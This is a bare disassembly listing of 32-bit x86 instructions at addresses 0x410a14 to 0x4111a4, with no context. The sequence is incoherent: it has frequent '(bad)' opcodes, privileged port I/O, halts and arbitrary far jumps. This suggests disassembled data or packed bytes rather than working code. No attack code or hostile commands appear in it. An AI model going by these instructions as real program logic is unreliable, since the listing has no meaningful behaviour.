  410a14:	jno    0x4109f6
  410a16:	retf   0xc38
  410a19:	out    0xd9,al
  410a1b:	push   eax
  410a1c:	and    eax,0x433a9fd6
  410a21:	hlt    
  410a22:	pop    ecx
  410a23:	arpl   WORD PTR [ebx],si
  410a25:	jecxz  0x410a47
  410a27:	dec    edi
  410a28:	pop    esp
  410a29:	in     al,dx
  410a2a:	pop    ebp
  410a2b:	push   0xffffffd2
  410a2d:	push   esp
  410a2e:	and    ah,BYTE PTR [edi+0x2edb8c5b]
  410a34:	pop    ebx
  410a35:	loopne 0x410a90
  410a37:	popa   
  410a38:	dec    ecx
  410a39:	push   ecx
  410a3a:	loopne 0x4109e3
  410a3c:	jp     0x410a1c
  410a3e:	adc    DWORD PTR [esi-0x346c56b4],ebx
  410a44:	jmp    0x941:0xce353f07
  410a4b:	mov    ebx,0x643f4457
  410a50:	pop    esp
  410a51:	rcr    BYTE PTR [ecx+0x5896fe6c],1
  410a57:	fwait
  410a58:	hlt    
  410a59:	(bad)  
  410a5a:	xlat   BYTE PTR ds:[ebx]
  410a5b:	xchg   DWORD PTR [ecx],ebp
  410a5d:	loopne 0x410a83
  410a5f:	mov    al,dh
  410a61:	push   edi
  410a62:	add    BYTE PTR [edx+0x7d],bh
  410a65:	push   eax
  410a66:	imul   ebx,ebx,0x11
  410a69:	mov    ah,0xe9
  410a6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a6c:	xchg   ebx,eax
  410a6d:	(bad)  
  410a6e:	out    0x5d,eax
  410a70:	out    0x5a,al
  410a72:	and    dl,dl
  410a74:	dec    esp
  410a75:	mov    ecx,gs
  410a77:	jnp    0x410aee
  410a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a7a:	loop   0x410a26
  410a7c:	pop    edx
  410a7d:	cwde   
  410a7e:	aam    0x3b
  410a80:	sbb    ah,BYTE PTR [esi+ebp*8+0x13]
  410a84:	dec    esp
  410a85:	clc    
  410a86:	(bad)  
  410a88:	cmp    edi,DWORD PTR [edi+0x1d]
  410a8b:	xchg   ecx,eax
  410a8c:	or     ebx,DWORD PTR [ebx]
  410a8e:	stc    
  410a8f:	pop    esp
  410a90:	mov    dh,0xb3
  410a92:	dec    edi
  410a93:	dec    ebx
  410a94:	dec    eax
  410a95:	mov    ebx,0xf2439fe8
  410a9a:	sub    BYTE PTR [ebp+0x427f1e0e],ah
  410aa0:	inc    ebx
  410aa1:	sub    DWORD PTR [eax],esp
  410aa3:	cs stc 
  410aa5:	or     ch,BYTE PTR [ecx+0x2ea15a49]
  410aab:	xlat   BYTE PTR ds:[ebx]
  410aac:	xchg   DWORD PTR [ebx-0x43214118],esp
  410ab2:	test   bh,ah
  410ab4:	dec    edx
  410ab5:	adc    eax,0x71f8df65
  410aba:	inc    ecx
  410abb:	cdq    
  410abc:	fist   DWORD PTR [edx+0x641f8d37]
  410ac2:	xor    eax,0x9b2ed69b
  410ac7:	and    dh,BYTE PTR [ebp-0x59]
  410aca:	sbb    bl,dl
  410acc:	(bad)  
  410acd:	in     al,dx
  410ace:	cmc    
  410acf:	dec    edx
  410ad0:	xchg   edx,eax
  410ad1:	loope  0x410ab6
  410ad3:	dec    edi
  410ad4:	jg     0x410ac8
  410ad6:	lahf   
  410ad7:	mov    esi,0x22957e7
  410adc:	test   al,0x9b
  410ade:	mov    ds:0x7f9ac09e,eax
  410ae3:	push   edi
  410ae4:	cdq    
  410ae5:	popa   
  410ae6:	scas   al,BYTE PTR es:[edi]
  410ae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ae8:	int3   
  410ae9:	rcr    DWORD PTR [eax-0x1fcdf2e5],1
  410aef:	jl     0x410b06
  410af1:	out    dx,eax
  410af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410af3:	inc    ebx
  410af4:	fs add al,0xde
  410af7:	clc    
  410af8:	fidiv  WORD PTR [eax]
  410afa:	out    0x59,al
  410afc:	ficomp DWORD PTR [ecx]
  410afe:	in     al,dx
  410aff:	ds hlt 
  410b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b02:	aas    
  410b03:	adc    eax,0x6e418a4a
  410b08:	add    BYTE PTR [ebx+0x2f77a93d],ah
  410b0e:	in     al,dx
  410b0f:	cld    
  410b10:	je     0x410aaa
  410b12:	repnz xchg esi,eax
  410b14:	out    0x53,eax
  410b16:	enter  0xc96a,0x2e
  410b1a:	pop    ebp
  410b1b:	dec    edx
  410b1c:	mov    ebp,0xfcc54c27
  410b21:	push   es
  410b22:	and    eax,0x14423409
  410b27:	jbe    0x410b24
  410b29:	pop    ebx
  410b2a:	push   es
  410b2b:	lahf   
  410b2c:	cmp    BYTE PTR [ebx],al
  410b2e:	fsub   QWORD PTR [ebp+0x31]
  410b31:	imul   ebp,DWORD PTR ds:0x32efb969,0x19
  410b38:	outs   dx,BYTE PTR ds:[esi]
  410b39:	cmp    BYTE PTR [ecx],dh
  410b3b:	jmp    0xaab3:0xfa13fe1
  410b42:	lds    edi,FWORD PTR [edx]
  410b44:	jmp    0x410b87
  410b46:	dec    eax
  410b47:	adc    edx,eax
  410b49:	push   ss
  410b4a:	lea    ebx,[esi]
  410b4c:	push   eax
  410b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b4e:	sbb    DWORD PTR [edx+0x478b24da],ebp
  410b54:	jne    0x410b69
  410b56:	mov    ?,WORD PTR [esi+0x1e]
  410b59:	imul   ecx,DWORD PTR [ebp-0x398c7f6a],0xe
  410b60:	xchg   ch,al
  410b62:	lea    esi,[ebx-0x1bfb3976]
  410b68:	std    
  410b69:	jae    0x410bc3
  410b6b:	(bad)  
  410b6c:	push   ecx
  410b6d:	and    dh,0x92
  410b70:	jmp    0x828bf24f
  410b75:	cwde   
  410b76:	loop   0x410b02
  410b78:	ds inc cx
  410b7b:	fistp  QWORD PTR [ebx]
  410b7d:	or     eax,0xe39ead10
  410b82:	ss dec esp
  410b84:	inc    edx
  410b85:	dec    eax
  410b86:	out    dx,eax
  410b87:	ret    
  410b88:	ficom  DWORD PTR [edi+0x5ba68aec]
  410b8e:	sbb    al,0x29
  410b90:	inc    edx
  410b91:	sbb    ch,bh
  410b93:	in     al,dx
  410b94:	mov    ds:0x9788437c,al
  410b99:	pop    ebx
  410b9a:	jle    0x410bba
  410b9c:	jg     0x410ba4
  410b9e:	mov    al,ds:0x10988b0b
  410ba3:	int3   
  410ba4:	inc    esp
  410ba5:	ja     0x410b3e
  410ba7:	repz xor BYTE PTR [eax+0x28a790d7],cl
  410bae:	test   DWORD PTR [ecx],ebx
  410bb0:	ret    
  410bb1:	fwait
  410bb2:	mov    eax,0xcf1e45ca
  410bb7:	les    ecx,FWORD PTR [ecx]
  410bb9:	loope  0x410bc2
  410bbb:	nop
  410bbc:	pop    ebp
  410bbd:	and    al,0xc4
  410bbf:	adc    eax,0xac6bf315
  410bc4:	jb     0x410b68
  410bc6:	stos   DWORD PTR es:[edi],eax
  410bc7:	mov    esi,0x16948fc0
  410bcc:	push   edx
  410bcd:	xor    BYTE PTR [eax-0x4],0x5f
  410bd1:	(bad)  
  410bd2:	sbb    edx,ebp
  410bd4:	xchg   esi,eax
  410bd5:	fadd   QWORD PTR [ebx+0x64]
  410bd8:	jge    0x410ba4
  410bda:	pop    esi
  410bdb:	lods   eax,DWORD PTR ds:[esi]
  410bdc:	xchg   edx,eax
  410bdd:	cmp    al,0xba
  410bdf:	imul   esi,DWORD PTR [ebp+0x10],0xffffffc5
  410be3:	sbb    al,BYTE PTR [esi-0x583ddc8e]
  410be9:	jae    0x410b6f
  410beb:	cdq    
  410bec:	fsubr  st,st(1)
  410bee:	push   esi
  410bef:	sub    BYTE PTR [eax-0x130e821c],dh
  410bf5:	scas   eax,DWORD PTR es:[edi]
  410bf6:	rcl    DWORD PTR [ecx+edx*1],cl
  410bf9:	int    0xc0
  410bfb:	xor    dh,al
  410bfd:	jae    0x410c79
  410bff:	xor    eax,0x1e38ffbb
  410c04:	daa    
  410c05:	jp     0x410c49
  410c07:	cmp    BYTE PTR [ebp+0x3c],bl
  410c0a:	jp     0x410c65
  410c0c:	add    edi,DWORD PTR [eax]
  410c0e:	and    BYTE PTR [ebx-0x6c],al
  410c11:	stc    
  410c12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c13:	push   ds
  410c14:	mov    dh,0x63
  410c16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c17:	push   DWORD PTR [ebx]
  410c19:	cmc    
  410c1a:	inc    eax
  410c1b:	push   ecx
  410c1c:	aas    
  410c1d:	inc    ebp
  410c1e:	push   0x827156bd
  410c23:	stc    
  410c24:	ret    0xa6c8
  410c27:	xchg   ebp,eax
  410c28:	mov    bh,0xdd
  410c2a:	push   eax
  410c2b:	sbb    DWORD PTR [esi],0x846c6465
  410c31:	outs   dx,DWORD PTR ds:[esi]
  410c32:	add    al,0x6b
  410c34:	mov    ds,WORD PTR [edi]
  410c36:	fdivr  QWORD PTR [ebp+edi*1-0x4b]
  410c3a:	inc    edi
  410c3b:	out    0x99,al
  410c3d:	mov    al,0x75
  410c3f:	xor    cl,BYTE PTR [edi+0x23f2da28]
  410c45:	cld    
  410c46:	mov    ecx,0x79d8122d
  410c4b:	les    edx,FWORD PTR ds:[esi]
  410c4e:	fdiv   DWORD PTR [ebx-0x6443a57c]
  410c54:	push   esp
  410c55:	or     bl,al
  410c57:	ficom  DWORD PTR [edi]
  410c59:	into   
  410c5a:	mov    eax,0x8517bc66
  410c5f:	add    al,0xe0
  410c61:	pop    ecx
  410c62:	cdq    
  410c63:	repnz mov esi,0x39a0ce9c
  410c69:	add    BYTE PTR [esi-0x80],al
  410c6c:	ins    BYTE PTR es:[edi],dx
  410c6d:	jb     0x410ccd
  410c6f:	nop
  410c70:	mov    eax,0xa9aea60d
  410c75:	lahf   
  410c76:	ffree  st(3)
  410c78:	mov    dh,0xcf
  410c7a:	sub    BYTE PTR [edx+0x74],dl
  410c7d:	mov    al,BYTE PTR [edi-0x18ec952b]
  410c83:	in     eax,0x15
  410c85:	dec    esi
  410c86:	data16 outs dx,BYTE PTR ds:[esi]
  410c88:	outs   dx,DWORD PTR ds:[esi]
  410c89:	xchg   ebx,eax
  410c8a:	adc    bl,al
  410c8c:	rcr    bh,cl
  410c8e:	cli    
  410c8f:	mov    dl,0xd5
  410c91:	je     0x410c60
  410c93:	sbb    ah,BYTE PTR [edx+0xb]
  410c96:	xor    eax,0x6ab4b0d5
  410c9b:	sbb    DWORD PTR [eax],ebx
  410c9d:	cmp    al,0xbd
  410c9f:	push   cs
  410ca0:	pop    edx
  410ca1:	xchg   esp,eax
  410ca2:	jle    0x410c50
  410ca4:	xchg   DWORD PTR [ecx],edx
  410ca6:	inc    ecx
  410ca7:	scas   eax,DWORD PTR es:[edi]
  410ca8:	sbb    dh,BYTE PTR [eax]
  410caa:	cdq    
  410cab:	loope  0x410c63
  410cad:	mov    dl,0x87
  410caf:	add    dh,BYTE PTR [eax]
  410cb1:	sub    DWORD PTR [ebx-0x5c],esi
  410cb4:	inc    ebx
  410cb5:	or     eax,0x60b78cc
  410cba:	test   DWORD PTR [eax+0x2b],esi
  410cbd:	loope  0x410c92
  410cbf:	dec    ebx
  410cc0:	sub    eax,DWORD PTR [edx-0x6c64cb50]
  410cc6:	(bad)  
  410cc7:	shl    BYTE PTR [esi],0x96
  410cca:	push   es
  410ccb:	in     eax,dx
  410ccc:	sbb    DWORD PTR [edi+0x106589ee],esp
  410cd2:	icebp  
  410cd3:	mov    BYTE PTR [esi],0xd9
  410cd6:	inc    ecx
  410cd7:	(bad)
  410cdd:	addr16 xchg edx,eax
  410cdf:	mov    WORD PTR [ebp-0x71],ds
  410ce2:	in     eax,dx
  410ce3:	aam    0x62
  410ce5:	xlat   BYTE PTR ds:[ebx]
  410ce6:	or     al,0x4b
  410ce8:	sbb    al,0xaf
  410cea:	icebp  
  410ceb:	add    eax,0xcd312e06
  410cf0:	call   0xf462:0xbafbc57b
  410cf7:	sub    al,dh
  410cf9:	inc    esi
  410cfa:	in     al,dx
  410cfb:	icebp  
  410cfc:	jnp    0x410cf4
  410cfe:	pop    ecx
  410cff:	loop   0x410c88
  410d01:	mov    fs:0x48049e4a,eax
  410d07:	pushf  
  410d08:	fiadd  WORD PTR [ecx-0x77863b3d]
  410d0e:	das    
  410d0f:	jle    0x410cf7
  410d11:	lahf   
  410d12:	addr16 jp 0x410cca
  410d15:	pop    ds
  410d16:	arpl   WORD PTR [ebp+edx*1+0x57],bp
  410d1a:	cs cmp ebx,esi
  410d1d:	(bad)  
  410d1f:	ds ret 0x8e76
  410d23:	inc    edx
  410d24:	inc    ebx
  410d25:	mov    ecx,0xf0b0a674
  410d2a:	cdq    
  410d2b:	pop    ecx
  410d2c:	iret   
  410d2d:	adc    al,BYTE PTR [edi+0x5d98aad6]
  410d33:	scas   eax,DWORD PTR es:[edi]
  410d34:	mov    ebp,0x168d59cd
  410d39:	scas   al,BYTE PTR es:[edi]
  410d3a:	jo     0x410d29
  410d3c:	pop    ebx
  410d3d:	int3   
  410d3e:	call   0xd394:0xc288f1e
  410d45:	sbb    BYTE PTR [esi],dh
  410d47:	jmp    0x410d01
  410d49:	loope  0x410d20
  410d4b:	mov    edi,0x9d60432e
  410d50:	sbb    eax,DWORD PTR [eax-0x52]
  410d53:	cmp    cl,BYTE PTR [edx-0xb2ef44a]
  410d59:	lds    edx,FWORD PTR [edx]
  410d5b:	adc    al,0x3e
  410d5d:	cs push ecx
  410d5f:	and    esp,DWORD PTR [edx+eiz*1]
  410d62:	in     eax,dx
  410d63:	and    eax,0xda7f7cfa
  410d68:	dec    ebp
  410d69:	push   ebp
  410d6a:	sub    DWORD PTR [ecx+0x82e9d53],ebp
  410d70:	push   edx
  410d71:	out    dx,al
  410d72:	pop    ebx
  410d73:	add    eax,0x522f6eda
  410d78:	xor    al,0xe5
  410d7a:	outs   dx,BYTE PTR ds:[esi]
  410d7b:	test   DWORD PTR [esi+eax*4-0x16],edx
  410d7f:	mov    gs,WORD PTR [ecx+0x79af55b2]
  410d85:	cli    
  410d86:	cmc    
  410d87:	and    eax,0x595130e1
  410d8c:	pop    esi
  410d8d:	push   esi
  410d8e:	xchg   ebx,eax
  410d8f:	cli    
  410d90:	sbb    al,0xd2
  410d92:	pop    edi
  410d93:	int3   
  410d94:	push   edi
  410d95:	(bad)  
  410d96:	mov    eax,ds:0x43571987
  410d9b:	cwde   
  410d9c:	test   DWORD PTR [eax],eax
  410d9e:	cmc    
  410d9f:	jo     0x410e11
  410da1:	push   ecx
  410da2:	jl     0x410dcd
  410da4:	imul   edi,DWORD PTR [esi],0x3708ff0d
  410daa:	inc    esp
  410dab:	xor    eax,0xe05cfec0
  410db0:	and    esi,DWORD PTR [edx+eiz*1-0x65]
  410db4:	sti    
  410db5:	es cdq 
  410db7:	fsubr  DWORD PTR [esi-0x69bc6e9e]
  410dbd:	jp     0x410d4f
  410dbf:	mov    ch,0xe9
  410dc1:	adc    BYTE PTR [esi],dh
  410dc3:	sub    dh,BYTE PTR [ebp-0x7e]
  410dc6:	cdq    
  410dc7:	jmp    0xcfbeab84
  410dcc:	jb     0x410dcb
  410dce:	retf   
  410dcf:	pop    edi
  410dd0:	jl     0x410e1f
  410dd2:	pop    es
  410dd3:	cs sahf 
  410dd5:	loop   0x410d71
  410dd7:	scas   al,BYTE PTR es:[edi]
  410dd8:	sti    
  410dd9:	fisttp DWORD PTR [ebp+0x22]
  410ddc:	mov    ch,0x89
  410dde:	adc    ch,cl
  410de0:	hlt    
  410de1:	fst    st(1)
  410de3:	adc    ebx,ecx
  410de5:	ins    DWORD PTR es:[edi],dx
  410de6:	dec    ecx
  410de7:	(bad)  
  410de8:	scas   al,BYTE PTR es:[edi]
  410de9:	ds inc ecx
  410deb:	ror    DWORD PTR [ebx+eax*8-0x1b9262e],0xa0
  410df3:	imul   BYTE PTR [edi]
  410df5:	(bad)  
  410df6:	push   ds
  410df7:	cld    
  410df8:	addr16 stc 
  410dfa:	repz sbb BYTE PTR [edi+0x759e7f0d],bl
  410e01:	in     al,0x1f
  410e03:	gs fwait
  410e05:	scas   al,BYTE PTR es:[edi]
  410e06:	aas    
  410e07:	mov    WORD PTR [edi+0x6e348017],ds
  410e0d:	and    BYTE PTR [ebp-0x11],bl
  410e10:	fld    DWORD PTR [edx-0x593ec118]
  410e16:	or     DWORD PTR [ebx],esi
  410e18:	nop
  410e19:	cmp    esi,eax
  410e1b:	jbe    0x410e0f
  410e1d:	stos   DWORD PTR es:[edi],eax
  410e1e:	clc    
  410e1f:	out    dx,eax
  410e20:	imul   esp,DWORD PTR [ebx],0xffffffe2
  410e23:	into   
  410e24:	xor    DWORD PTR [edi+edi*2-0x7910906f],esp
  410e2b:	jecxz  0x410eac
  410e2d:	les    ecx,FWORD PTR [esi]
  410e2f:	iret   
  410e30:	dec    edx
  410e31:	cld    
  410e32:	or     ch,bh
  410e34:	test   BYTE PTR [edi+0x6e],dh
  410e37:	sub    ch,ah
  410e39:	adc    DWORD PTR [ecx+0x3b3cbd61],eax
  410e3f:	(bad)  
  410e40:	mov    ebp,0x8c831e1d
  410e45:	add    BYTE PTR [edi],cl
  410e47:	es dec ebp
  410e49:	int3   
  410e4a:	dec    esi
  410e4b:	cs mov edi,0x16cf3593
  410e51:	ss pop ecx
  410e53:	(bad)  
  410e54:	jmp    0x37f3:0x5cfaeafb
  410e5b:	add    eax,0x787166d0
  410e60:	dec    ecx
  410e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e62:	(bad)
  410e65:	ror    DWORD PTR ds:0x2dd4aa0f,cl
  410e6b:	test   DWORD PTR [ecx+0x68e5bb46],edx
  410e71:	dec    ecx
  410e72:	repz mov esi,0x7fa583c0
  410e78:	ins    BYTE PTR es:[edi],dx
  410e79:	jnp    0x410e8a
  410e7b:	jne    0x410e13
  410e7d:	repz test eax,0x259f2794
  410e83:	cmp    BYTE PTR [ebx+0x1c],al
  410e86:	jmp    0x410e0a
  410e88:	cli    
  410e89:	or     al,0x19
  410e8b:	xlat   BYTE PTR ds:[ebx]
  410e8c:	mov    DWORD PTR [ebx],0x6efd514f
  410e92:	mov    esp,edx
  410e94:	push   cs
  410e95:	jle    0x410e24
  410e97:	in     al,0x87
  410e99:	mov    al,ds:0x283381c
  410e9e:	xchg   ebp,eax
  410e9f:	ss (bad) 
  410ea2:	out    0xf3,al
  410ea4:	sbb    bl,BYTE PTR [edi]
  410ea6:	retf   
  410ea7:	(bad)  
  410ea8:	mov    esp,0xedf07b23
  410ead:	xchg   ebp,eax
  410eae:	pop    esi
  410eaf:	add    eax,0xb1025e48
  410eb4:	ja     0x410ea0
  410eb6:	pop    ss
  410eb7:	mov    dh,0x2a
  410eb9:	push   0xb4fe147e
  410ebe:	pop    ebx
  410ebf:	jl     0x410e56
  410ec1:	push   0xffffffbb
  410ec3:	cwde   
  410ec4:	ror    DWORD PTR [edx+0x7f],1
  410ec7:	mov    edx,0xab65e6de
  410ecc:	(bad)  
  410ecd:	in     al,0x7b
  410ecf:	mov    ah,0x7a
  410ed1:	es (bad) 
  410ed3:	aad    0xc5
  410ed5:	add    eax,0x45ff2148
  410eda:	aad    0x7f
  410edc:	mov    ebx,ecx
  410ede:	test   BYTE PTR [edx-0x7d],bh
  410ee1:	xlat   BYTE PTR ds:[ebx]
  410ee2:	adc    al,0xb8
  410ee4:	addr16 std 
  410ee6:	data16 and ch,ah
  410ee9:	call   0xd3f0:0x5c176475
  410ef0:	stos   BYTE PTR es:[edi],al
  410ef1:	(bad)  
  410ef2:	cld    
  410ef3:	shl    DWORD PTR [ecx],cl
  410ef5:	xor    bl,BYTE PTR [ebx-0x635b09a3]
  410efb:	in     eax,0x8
  410efd:	outs   dx,DWORD PTR ds:[esi]
  410efe:	pop    esp
  410eff:	test   BYTE PTR [edi],0x71
  410f02:	out    dx,eax
  410f03:	mov    ah,0x7c
  410f05:	xchg   edi,eax
  410f06:	add    ecx,DWORD PTR [ecx-0x9]
  410f09:	pop    ebp
  410f0a:	mov    bl,0xaa
  410f0c:	imul   eax,DWORD PTR [edi],0x2fed4041
  410f12:	ds sbb eax,0x7ebd626e
  410f18:	mov    DWORD PTR [ebx-0x5c],eax
  410f1b:	sbb    al,BYTE PTR [edi+0x541a0312]
  410f21:	adc    ecx,edx
  410f23:	repz in eax,0x84
  410f26:	sbb    eax,0x3daca022
  410f2b:	mov    dl,BYTE PTR [ecx]
  410f2d:	sub    ecx,DWORD PTR [edx]
  410f2f:	xchg   edx,eax
  410f30:	cdq    
  410f31:	or     dh,cl
  410f33:	fstp   st(6)
  410f35:	sbb    bh,BYTE PTR [esi+0x66aaf86d]
  410f3b:	add    BYTE PTR [edi-0x2f111f25],bh
  410f41:	mov    bh,0xca
  410f43:	jl     0x410f1e
  410f45:	inc    ebx
  410f46:	repnz xchg esp,eax
  410f48:	push   0x9edb80bb
  410f4d:	dec    ecx
  410f4e:	and    eax,0x622c7edb
  410f53:	mov    BYTE PTR [edx],bh
  410f55:	pop    ecx
  410f56:	shl    DWORD PTR ds:0x25e8dca0,1
  410f5c:	pop    ebp
  410f5d:	and    al,0x9b
  410f5f:	addr16 mov bl,0x4e
  410f62:	popa   
  410f63:	addr16 push ss
  410f65:	adc    eax,0x6d1edf42
  410f6a:	fldenv [edi+0x79]
  410f6d:	xor    al,0xc1
  410f6f:	test   BYTE PTR cs:0x5dd05abb,bl
  410f76:	(bad)  
  410f77:	mov    edi,0x456d7247
  410f7c:	pop    es
  410f7d:	sub    eax,0xa4f9cad8
  410f82:	or     eax,0x23e63840
  410f87:	lods   eax,DWORD PTR ds:[esi]
  410f88:	push   ecx
  410f89:	mov    esi,0x3eda3c47
  410f8e:	sbb    DWORD PTR [ecx+0x556a6169],esp
  410f94:	cmp    esp,0x7e
  410f97:	sti    
  410f98:	xor    al,0x51
  410f9a:	cmp    BYTE PTR [ecx+0x1],ah
  410f9d:	jmp    0xfebec45a
  410fa2:	popa   
  410fa3:	dec    edx
  410fa4:	lds    edi,FWORD PTR [edi-0x76543075]
  410faa:	clc    
  410fab:	pop    esi
  410fac:	pushf  
  410fad:	adc    BYTE PTR [eax-0x79f7441d],dl
  410fb3:	adc    bh,cl
  410fb5:	mov    edx,0xb650a35b
  410fba:	jl     0x410f9a
  410fbc:	mov    ebx,0x71bf8be4
  410fc1:	adc    eax,0xcc1fd945
  410fc6:	add    eax,0xa5ac8a63
  410fcb:	cdq    
  410fcc:	mov    ?,WORD PTR fs:[edx]
  410fcf:	dec    edi
  410fd0:	shr    BYTE PTR [ebx],0xd1
  410fd3:	push   ebp
  410fd4:	and    BYTE PTR [edx+eiz*2],bh
  410fd7:	data16 mov ah,0x65
  410fda:	mov    bh,cl
  410fdc:	int3   
  410fdd:	imul   edi,DWORD PTR [edi],0xfffffff9
  410fe0:	int    0xcd
  410fe2:	dec    edx
  410fe3:	stos   BYTE PTR es:[edi],al
  410fe4:	adc    bh,BYTE PTR [edx]
  410fe6:	pusha  
  410fe7:	pop    ebp
  410fe8:	into   
  410fe9:	mov    ch,0xe7
  410feb:	rol    BYTE PTR [eax+0x48d9cbea],0x4
  410ff2:	mov    al,0x21
  410ff4:	aas    
  410ff5:	ins    BYTE PTR es:[edi],dx
  410ff6:	sbb    DWORD PTR [si+0x43f3],0xffffff98
  410ffc:	push   eax
  410ffd:	into   
  410ffe:	test   al,0xe6
  411000:	es in  al,0xbf
  411003:	xor    al,0x8d
  411005:	and    eax,0x6eb4cfaa
  41100a:	ret    
  41100b:	xlat   BYTE PTR ds:[ebx]
  41100c:	imul   DWORD PTR [eax+0x27]
  41100f:	mov    ds:0xe2a1e43f,eax
  411014:	out    0x8a,al
  411016:	mov    ah,0x16
  411018:	shl    esp,0x5b
  41101b:	aam    0xe2
  41101d:	mov    ch,0xc0
  41101f:	in     eax,0xf
  411021:	into   
  411022:	sbb    BYTE PTR [ecx+0x3924eae8],cl
  411028:	inc    esp
  411029:	shr    BYTE PTR [edi-0x47],0x7c
  41102d:	or     DWORD PTR [eax-0x78],edi
  411030:	mov    ebp,0x937d5a7f
  411035:	or     al,0x68
  411037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411038:	(bad)  
  411039:	daa    
  41103a:	pop    esi
  41103b:	lds    ecx,FWORD PTR [eax+esi*4]
  41103e:	push   esp
  41103f:	lea    eax,[ebx+0x150651d8]
  411045:	(bad)  
  411046:	push   0xadc289d3
  41104b:	jp     0x410fd5
  41104d:	mov    WORD PTR [edi+0x540ccbba],es
  411053:	and    ebp,DWORD PTR [eax+0xb030523]
  411059:	(bad)  
  41105b:	inc    esp
  41105c:	fist   WORD PTR [ebx]
  41105e:	test   DWORD PTR [edi-0x73e1d60e],edi
  411064:	inc    ebp
  411065:	out    0x33,eax
  411067:	je     0x411060
  411069:	jle    0x4110b9
  41106b:	imul   esp,DWORD PTR [edx+0x5e],0xba3d8f54
  411072:	dec    esi
  411073:	das    
  411074:	in     al,dx
  411075:	push   esi
  411076:	cmp    ecx,DWORD PTR [edx-0x44]
  411079:	xchg   BYTE PTR [eax+0x54670303],dh
  41107f:	cmc    
  411080:	mov    al,ds:0x810901aa
  411085:	out    dx,eax
  411086:	mov    esp,0xdbeaeb3a
  41108b:	xor    BYTE PTR [ecx],ah
  41108d:	inc    esi
  41108e:	fsubp  st(6),st
  411090:	adc    bl,dh
  411092:	and    eax,0xf1a2a687
  411097:	jbe    0x41103f
  411099:	xchg   ebp,eax
  41109a:	mov    ah,BYTE PTR [edi-0x7b]
  41109d:	loopne 0x411058
  41109f:	mov    dh,0x29
  4110a1:	mov    cl,0x1d
  4110a3:	shr    DWORD PTR [ebp-0x41],cl
  4110a6:	outs   dx,DWORD PTR cs:[esi]
  4110a8:	mov    edi,0x65eaa718
  4110ad:	nop
  4110ae:	push   ebp
  4110af:	pop    esp
  4110b0:	leave  
  4110b1:	push   ebp
  4110b2:	mov    es,eax
  4110b4:	lahf   
  4110b5:	popf   
  4110b6:	dec    ebx
  4110b7:	adc    ah,BYTE PTR [ecx-0x4b655dc]
  4110bd:	inc    ebp
  4110be:	sbb    al,0x4
  4110c0:	pop    esp
  4110c1:	or     bh,dh
  4110c3:	loopne 0x41109f
  4110c5:	push   esi
  4110c6:	push   0x1081c82c
  4110cb:	jp     0x4110b5
  4110cd:	ins    DWORD PTR es:[edi],dx
  4110ce:	cdq    
  4110cf:	xchg   BYTE PTR [eax],bl
  4110d1:	adc    BYTE PTR [eax-0x3068bb3e],bh
  4110d7:	push   es
  4110d8:	push   esi
  4110d9:	jne    0x4110ca
  4110db:	mov    al,ds:0x74246cf8
  4110e0:	push   esp
  4110e1:	dec    ebx
  4110e2:	mov    al,0x20
  4110e4:	jns    0x411106
  4110e6:	pop    ebp
  4110e7:	mov    edi,0xe35fd4e
  4110ec:	and    bh,BYTE PTR [ebx+0x26]
  4110ef:	jge    0x411117
  4110f1:	xchg   ebp,eax
  4110f2:	mov    al,ds:0xe29be78d
  4110f7:	xor    eax,0x7fe48d73
  4110fc:	inc    edx
  4110fd:	iret   
  4110fe:	arpl   WORD PTR [ebp+0x1e],sp
  411101:	stos   BYTE PTR es:[edi],al
  411102:	push   ss
  411103:	pushf  
  411104:	dec    eax
  411105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411106:	hlt    
  411107:	sahf   
  411108:	xchg   esi,eax
  411109:	int3   
  41110a:	and    dl,BYTE PTR [esi-0x6f]
  41110d:	jae    0x411112
  41110f:	out    0xc6,al
  411111:	pusha  
  411112:	pop    edi
  411113:	push   ss
  411114:	data16 adc bl,BYTE PTR [edi+0x12]
  411118:	sbb    dl,BYTE PTR [edx]
  41111a:	(bad)  
  41111b:	stos   BYTE PTR es:[edi],al
  41111c:	loopne 0x411198
  41111e:	xchg   esp,eax
  41111f:	cmp    dl,BYTE PTR [edx+0x1abfea2]
  411125:	and    DWORD PTR [ebp+ecx*4-0x25fe38c],esp
  41112c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41112d:	ds pop es
  41112f:	sub    DWORD PTR [eax],ecx
  411131:	xchg   edi,eax
  411132:	cs mov dl,0xda
  411135:	das    
  411136:	pop    ss
  411137:	(bad)  
  411138:	or     eax,0xadee9481
  41113d:	dec    edi
  41113e:	inc    esp
  41113f:	jae    0x411135
  411141:	je     0x411125
  411143:	fsubrp st(1),st
  411145:	jg     0x411171
  411147:	add    dh,BYTE PTR [edi+0x481b176b]
  41114d:	lods   al,BYTE PTR ds:[esi]
  41114e:	adc    eax,0xf01bc052
  411153:	sti    
  411154:	mov    ds:0x2ecaf608,al
  411159:	push   ebp
  41115a:	pop    ebp
  41115b:	jbe    0x411195
  41115d:	repz cmp BYTE PTR [eax+0x2fece5ab],0x7
  411165:	cmp    eax,0x783effdd
  41116a:	(bad)  
  41116b:	dec    ebx
  41116c:	dec    edx
  41116d:	daa    
  41116e:	adc    al,0x27
  411170:	out    dx,al
  411171:	imul   edi,DWORD PTR [esp+edi*1],0xafbe95d6
  411178:	pushf  
  411179:	cmp    ebp,esp
  41117b:	sbb    bh,BYTE PTR [esi+0x71398784]
  411181:	jno    0x4111fa
  411183:	xchg   ebp,eax
  411184:	jmp    0xeb43:0xb183c570
  41118b:	and    eax,0x8ac8e929
  411190:	sub    DWORD PTR [ebp-0x67],edx
  411193:	mov    bh,dh
  411195:	rol    BYTE PTR fs:[edi+0x2f],0xf0
  41119a:	dec    edi
  41119b:	jp     0x411172
  41119d:	push   ecx
  41119e:	xchg   esp,eax
  41119f:	mov    ebx,0xc9297bf5
  4111a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
